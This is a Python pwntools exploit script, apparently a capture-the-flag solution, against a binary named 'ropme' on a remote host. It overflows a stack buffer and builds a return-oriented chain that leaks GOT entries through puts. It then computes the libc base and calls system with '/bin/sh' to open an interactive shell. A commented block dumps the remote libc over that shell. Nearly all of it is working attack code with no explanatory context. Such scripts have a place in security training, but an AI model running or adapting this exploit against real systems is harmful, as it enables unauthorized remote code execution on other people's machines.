from pwn import *

exe = './ropme'
context.binary = exe

# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)


# p = process(exe)
p = remote('138.68.182.108', 31305)

elf = ELF(exe)
#rbp is at offset 64

POP_RDI = 0x00000000004006d3
POP_RSI_R15 = 0x00000000004006d1

p.recv(timeout=0.5)

def leak_bytes(address):
    payload = flat({
        64: 0x00007fffffffdfd0,  # rbp i guess
        72: POP_RDI,
        80: address,
        88: elf.plt['puts'],
        96: elf.sym['main']
    })
    p.sendline(payload)
    result = p.recv(timeout=0.5)
    leak = result.split(b'\nROP me')[0]
    # log.info(f"Read address {hex(address)}: {leak}")
    if len(leak) == 0: return b'\x00'
    else: return leak

def leak_memory_with_puts(address):
    leak = leak_bytes(address)
    return int.from_bytes(leak, 'little')

def leak_function_addr(func):
    leak = leak_memory_with_puts(elf.got[func])
    log.info(f"{func} = {hex(leak)}")
    return leak

# gdb.attach(p, f"""
# b * 0x0040066c
# c
# """)

#old libc version: 885acc6870b8ba98983e88e578179a2c

leak_function_addr('fflush')
leak_function_addr('puts')
LEAK_FGETS = leak_function_addr('fgets')

REMOTE_LIBC_SH = 0x18cd17

OFFSET_FGETS_FROM_BASE_REMOTE = 0x6dad0
LIBC_BASE = LEAK_FGETS - OFFSET_FGETS_FROM_BASE_REMOTE

BIN_SH = LIBC_BASE + REMOTE_LIBC_SH

# d = DynELF(leak_bytes, LIBC_BASE)
# SYSTEM = d.lookup('system')
SYSTEM_OFFSET = 0x45390
SYSTEM = LIBC_BASE + SYSTEM_OFFSET

log.info(f"SYSTEM_OFFSET = {hex(SYSTEM - LIBC_BASE)}")

payload = flat({
    64: 0x00007fffffffdfd0,  # rbp i guess
    72: POP_RDI,
    80: BIN_SH,
    88: SYSTEM,
    96: elf.sym['main']
})

p.sendline(payload)
p.interactive()

## Download old libc from the server so I can add it to my database
# p.sendline('base64 /lib/x86_64-linux-gnu/libc.so.6')
# while True:
#     print(p.recv().decode('latin-1'))